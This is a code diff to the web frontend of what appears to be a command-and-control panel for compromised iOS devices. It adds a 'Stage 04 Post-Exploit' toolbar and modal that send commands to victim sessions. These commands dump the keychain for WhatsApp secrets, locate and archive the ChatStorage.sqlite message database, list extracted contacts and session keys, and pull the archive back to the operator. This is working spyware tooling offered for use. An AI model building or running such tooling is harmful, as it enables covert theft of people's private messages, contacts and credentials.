@@ -711,6 +711,12 @@
             border: 1px solid rgba(16, 185, 129, 0.35);
         }
 
+        .cat-stage4 {
+            background: rgba(168, 85, 247, 0.18);
+            color: #d8b4fe;
+            border: 1px solid rgba(168, 85, 247, 0.4);
+        }
+
         .cat-ui, .cat-http {
             background: rgba(148, 163, 184, 0.12);
             color: #94a3b8;
@@ -985,6 +991,21 @@
                         <button class="macro-chip" data-cmd="env | sort">Environment</button>
                     </div>
 
+                    <!-- Stage 4: Post-Exploitation Actions -->
+                    <div class="quick-macros stage4-macros" style="margin-top:6px; padding-top:6px; border-top:1px dashed rgba(168, 85, 247, 0.25);">
+                        <span class="macro-label" style="color:#c084fc; font-weight:700;">Stage 04 Post-Exploit:</span>
+                        <button class="macro-chip" id="btnExtractWhatsApp" style="border-color: rgba(168, 85, 247, 0.5); background: rgba(168, 85, 247, 0.16); color: #e9d5ff; font-weight: 600;">
+                            ⚡ Extract WhatsApp (waextract)
+                        </button>
+                        <button class="macro-chip" id="btnOpenStage4Modal" style="border-color: rgba(16, 185, 129, 0.4); background: rgba(16, 185, 129, 0.12); color: #6ee7b7;">
+                            📊 WhatsApp Intel Viewer
+                        </button>
+                        <button class="macro-chip" data-cmd="find /var/mobile/Containers/Data/Application -name '*whatsapp*' 2>/dev/null || true">Locate WA Container</button>
+                        <button class="macro-chip" data-cmd="security dump-keychain -d 2>/dev/null | grep -i whatsapp || true">Dump WA Keychain</button>
+                        <button class="macro-chip" data-cmd="ls -la /var/mobile/Containers/Data/Application 2>/dev/null | head -n 30">List App Containers</button>
+                        <button class="macro-chip" data-cmd="tar -czf /tmp/wa_backup.tar.gz /var/mobile/Containers/Data/Application/*/Documents/ChatStorage.sqlite 2>/dev/null && ls -la /tmp/wa_backup.tar.gz">Backup ChatStorage</button>
+                    </div>
+
                     <!-- Terminal Output -->
                     <div class="terminal-viewport" id="terminalViewport">
                         <div class="term-system">[*] Select an active C2 session on the left (or click "+ Spawn Test Session") to begin interactive command execution.</div>
@@ -1015,6 +1036,7 @@
                     <div class="filter-pills" id="logCategoryFilters">
                         <button class="btn btn-sm btn-primary" data-filter="all">All Events</button>
                         <button class="btn btn-sm" data-filter="exploit">Exploit Stages</button>
+                        <button class="btn btn-sm" data-filter="stage4">Stage 4 // Post-Exploit</button>
                         <button class="btn btn-sm" data-filter="payload">Payloads &amp; Dylib</button>
                         <button class="btn btn-sm" data-filter="c2">C2 Socket Events</button>
                         <button class="btn btn-sm" data-filter="ui">UI &amp; Static</button>
@@ -1112,6 +1134,81 @@
                         <input type="text" class="input-field" id="cfg_static_files_dir" />
                     </div>
                 </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- STAGE 4 WHATSAPP INTEL MODAL -->
+    <div class="modal-backdrop" id="stage4Modal">
+        <div class="modal-box" style="max-width: 820px;">
+            <div class="panel-header">
+                <div class="panel-title" style="display:flex; align-items:center; gap:8px;">
+                    <span class="stage-pill cat-stage4">Stage 04</span>
+                    <span>WhatsApp Intelligence &amp; Data Extraction</span>
+                </div>
+                <button class="btn btn-sm" id="btnCloseStage4Modal">Close (Esc)</button>
+            </div>
+            <div style="padding: 16px 20px 20px; overflow-y: auto;">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 14px; padding-bottom: 12px; border-bottom: 1px solid var(--border-subtle); flex-wrap: wrap; gap: 8px;">
+                    <div style="display:flex; align-items:center; gap:8px;">
+                        <span class="metric-label">Extraction Status:</span>
+                        <span class="tag-badge" id="stage4StatusBadge" style="background: rgba(168, 85, 247, 0.2); color: #c084fc; border-color: rgba(168, 85, 247, 0.4);">IDLE / READY</span>
+                    </div>
+                    <div style="display:flex; gap:8px;">
+                        <button class="btn btn-emerald btn-sm" id="btnStage4RunNow">⚡ Run waextract Now</button>
+                        <button class="btn btn-primary btn-sm" id="btnStage4DownloadArchive" disabled>📥 Retrieve Archive (waget)</button>
+                    </div>
+                </div>
+
+                <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 10px; margin-bottom: 16px;">
+                    <div class="metric-card" style="padding: 10px 12px;">
+                        <span class="metric-label">App Identifier</span>
+                        <div class="metric-value" id="waResBundle" style="font-size:0.82rem; color:#bae6fd;">net.whatsapp.WhatsApp</div>
+                    </div>
+                    <div class="metric-card" style="padding: 10px 12px;">
+                        <span class="metric-label">Total Messages</span>
+                        <div class="metric-value" id="waResMessages" style="font-size:1.15rem; color:var(--accent-emerald);">0</div>
+                    </div>
+                    <div class="metric-card" style="padding: 10px 12px;">
+                        <span class="metric-label">Contacts Found</span>
+                        <div class="metric-value" id="waResContactsCount" style="font-size:1.15rem; color:var(--accent-cyan);">0</div>
+                    </div>
+                    <div class="metric-card" style="padding: 10px 12px;">
+                        <span class="metric-label">Session Keys</span>
+                        <div class="metric-value" id="waResKeysCount" style="font-size:1.15rem; color:#e879f9;">0</div>
+                    </div>
+                </div>
+
+                <div style="background: rgba(15, 23, 42, 0.65); border: 1px solid var(--border-subtle); border-radius: 8px; padding: 10px 12px; margin-bottom: 14px; font-family: var(--font-mono); font-size: 0.74rem;">
+                    <div style="display:flex; margin-bottom: 4px;">
+                        <span style="color:var(--text-muted); width: 130px; flex-shrink: 0;">Container:</span>
+                        <span id="waResContainer" style="color:#bae6fd; word-break:break-all;">Not scanned yet</span>
+                    </div>
+                    <div style="display:flex; margin-bottom: 4px;">
+                        <span style="color:var(--text-muted); width: 130px; flex-shrink: 0;">Chat Database:</span>
+                        <span id="waResChatDb" style="color:#bae6fd; word-break:break-all;">Not located</span>
+                    </div>
+                    <div style="display:flex;">
+                        <span style="color:var(--text-muted); width: 130px; flex-shrink: 0;">Target Archive:</span>
+                        <span id="waResArchive" style="color:#34d399; word-break:break-all;">None</span>
+                    </div>
+                </div>
+
+                <div class="panel-title" style="margin-bottom: 8px; font-size: 0.8rem;">Extracted Contacts Preview</div>
+                <div class="log-table-wrap" style="max-height: 220px; overflow-y: auto;">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Partner JID</th>
+                                <th>Name</th>
+                                <th>Push Name</th>
+                            </tr>
+                        </thead>
+                        <tbody id="waContactsTableBody">
+                            <tr><td colspan="3" class="empty-state">No contacts extracted yet. Select an active session and click "Run waextract Now".</td></tr>
+                        </tbody>
+                    </table>
+                </div>
             </div>
         </div>
     </div>
@@ -1426,7 +1523,7 @@
             });
 
             // Quick Recon Macro Chips
-            document.querySelectorAll(".macro-chip").forEach((chip) => {
+            document.querySelectorAll(".macro-chip[data-cmd]").forEach((chip) => {
                 chip.addEventListener("click", () => {
                     if (!state.selectedSessionId) {
                         showToast("Select or spawn an active session first");
@@ -1434,6 +1531,126 @@
                     }
                     sendSessionCommand(state.selectedSessionId, chip.dataset.cmd);
                 });
+            });
+
+            // Stage 4 WhatsApp Intelligence
+            function updateStage4UI(data) {
+                if (!data) return;
+                const res = data.result || data;
+                state.stage4 = state.stage4 || {};
+                state.stage4.lastResult = res;
+
+                const badge = el("stage4StatusBadge");
+                if (res.error) {
+                    badge.textContent = `ERROR: ${res.error}`;
+                    badge.style.background = "rgba(244, 63, 94, 0.2)";
+                    badge.style.color = "#fda4af";
+                    badge.style.borderColor = "rgba(244, 63, 94, 0.4)";
+                } else {
+                    badge.textContent = "EXTRACTION SUCCESS";
+                    badge.style.background = "rgba(16, 185, 129, 0.2)";
+                    badge.style.color = "#34d399";
+                    badge.style.borderColor = "rgba(16, 185, 129, 0.4)";
+                }
+
+                if (res.bundle_id) el("waResBundle").textContent = res.bundle_id;
+                el("waResMessages").textContent = res.messages_count || 0;
+                el("waResContactsCount").textContent = (res.contacts || []).length;
+                el("waResKeysCount").textContent = (res.session_keys || []).length;
+                el("waResContainer").textContent = res.container || "Not found";
+                el("waResChatDb").textContent = res.chat_db || "Not found";
+                el("waResArchive").textContent = res.archive || "None";
+
+                const btnDl = el("btnStage4DownloadArchive");
+                if (res.archive) {
+                    btnDl.disabled = false;
+                    state.stage4.archivePath = res.archive;
+                }
+
+                const tbody = el("waContactsTableBody");
+                const contacts = res.contacts || [];
+                if (contacts.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="3" class="empty-state">${res.error ? escapeHtml(res.error) : "No contacts found or WhatsApp not installed."}</td></tr>`;
+                } else {
+                    tbody.innerHTML = contacts.map((c) => `
+                        <tr>
+                            <td style="color:var(--accent-cyan); font-family:var(--font-mono);">${escapeHtml(c.jid || "—")}</td>
+                            <td style="font-weight:600;">${escapeHtml(c.name || "—")}</td>
+                            <td style="color:var(--text-secondary);">${escapeHtml(c.push_name || "—")}</td>
+                        </tr>
+                    `).join("");
+                }
+            }
+
+            async function triggerWhatsAppExtraction() {
+                if (!state.selectedSessionId) {
+                    showToast("Select or spawn an active session first");
+                    return;
+                }
+                const badge = el("stage4StatusBadge");
+                badge.textContent = "EXTRACTING...";
+                badge.style.background = "rgba(245, 158, 11, 0.2)";
+                badge.style.color = "#fbbf24";
+                badge.style.borderColor = "rgba(245, 158, 11, 0.4)";
+                showToast("Deploying Stage 4 WhatsApp Extractor...");
+                el("stage4Modal").classList.add("open");
+
+                try {
+                    const res = await fetch(`/api/sessions/${encodeURIComponent(state.selectedSessionId)}/waextract`, {
+                        method: "POST"
+                    });
+                    const data = await res.json();
+                    if (data.ok && data.result) {
+                        updateStage4UI(data.result);
+                        showToast("Stage 4 WhatsApp extraction completed!");
+                    } else if (data.message) {
+                        showToast(data.message);
+                    } else if (data.error) {
+                        updateStage4UI({ error: data.error });
+                        showToast(`Stage 4 error: ${data.error}`);
+                    }
+                } catch (e) {
+                    showToast("Error initiating extraction");
+                }
+            }
+
+            el("btnExtractWhatsApp").addEventListener("click", triggerWhatsAppExtraction);
+            el("btnStage4RunNow").addEventListener("click", triggerWhatsAppExtraction);
+
+            el("btnOpenStage4Modal").addEventListener("click", () => {
+                el("stage4Modal").classList.add("open");
+            });
+
+            el("btnCloseStage4Modal").addEventListener("click", () => {
+                el("stage4Modal").classList.remove("open");
+            });
+
+            el("btnStage4DownloadArchive").addEventListener("click", async () => {
+                if (!state.selectedSessionId) {
+                    showToast("Select an active session first");
+                    return;
+                }
+                const path = state.stage4 && state.stage4.archivePath;
+                if (!path) {
+                    showToast("No archive path recorded");
+                    return;
+                }
+                showToast(`Retrieving archive ${path} from target...`);
+                try {
+                    const res = await fetch(`/api/sessions/${encodeURIComponent(state.selectedSessionId)}/waget`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ archive_path: path })
+                    });
+                    const data = await res.json();
+                    if (data.ok) {
+                        showToast(`Archive saved locally: ${data.filename} (${formatBytes(data.size)})`);
+                    } else {
+                        showToast(data.error || "Failed to retrieve archive");
+                    }
+                } catch (e) {
+                    showToast("Error retrieving archive");
+                }
             });
 
             // Broadcast form
@@ -1514,7 +1731,14 @@
                 const tbody = el("telemetryTableBody");
                 const q = state.logSearch.toLowerCase();
                 const filtered = state.logs.filter((item) => {
-                    if (state.logFilter !== "all" && item.category !== state.logFilter) return false;
+                    if (state.logFilter !== "all") {
+                        if (state.logFilter === "stage4") {
+                            const hay = `${item.label || ""} ${item.path || ""} ${item.category || ""}`.toLowerCase();
+                            if (!hay.includes("stage 4") && !hay.includes("waextract") && !hay.includes("post_exploit") && !hay.includes("whatsapp")) return false;
+                        } else if (item.category !== state.logFilter) {
+                            return false;
+                        }
+                    }
                     if (q) {
                         const hay = `${item.ip} ${item.path} ${item.label} ${item.method}`.toLowerCase();
                         if (!hay.includes(q)) return false;
@@ -1579,7 +1803,7 @@
                 grid.innerHTML = stages.map((st) => `
                     <div class="stage-card">
                         <div class="stage-card-top">
-                            <span class="stage-pill cat-exploit">${escapeHtml(st.stage)}</span>
+                            <span class="stage-pill ${st.stage === 'Stage 4' ? 'cat-stage4' : 'cat-exploit'}">${escapeHtml(st.stage)}</span>
                             <span class="metric-sub">${formatBytes(st.size)}</span>
                         </div>
                         <div class="stage-filename">${escapeHtml(st.filename)}</div>
@@ -1627,7 +1851,10 @@
             el("btnInspectManifest").addEventListener("click", () => openSourceModal("payloads/manifest.json"));
             el("btnCloseModal").addEventListener("click", () => el("sourceModal").classList.remove("open"));
             window.addEventListener("keydown", (e) => {
-                if (e.key === "Escape") el("sourceModal").classList.remove("open");
+                if (e.key === "Escape") {
+                    el("sourceModal").classList.remove("open");
+                    el("stage4Modal").classList.remove("open");
+                }
             });
 
             // Configuration Tab
@@ -1733,6 +1960,15 @@
                     } else if (msg.event === "logs_cleared") {
                         state.logs = [];
                         renderLogsTable();
+                    } else if (msg.event === "stage4_result") {
+                        if (msg.data && (msg.data.result || msg.data.ok !== undefined)) {
+                            updateStage4UI(msg.data);
+                            showToast(`Stage 4: WhatsApp extraction complete for [${msg.session_id}]`);
+                        }
+                    } else if (msg.event === "stage4_waget_result") {
+                        if (msg.data && msg.data.ok) {
+                            showToast(`Stage 4: Archive ${msg.data.filename} retrieved (${formatBytes(msg.data.size)})`);
+                        }
                     }
                 };
 
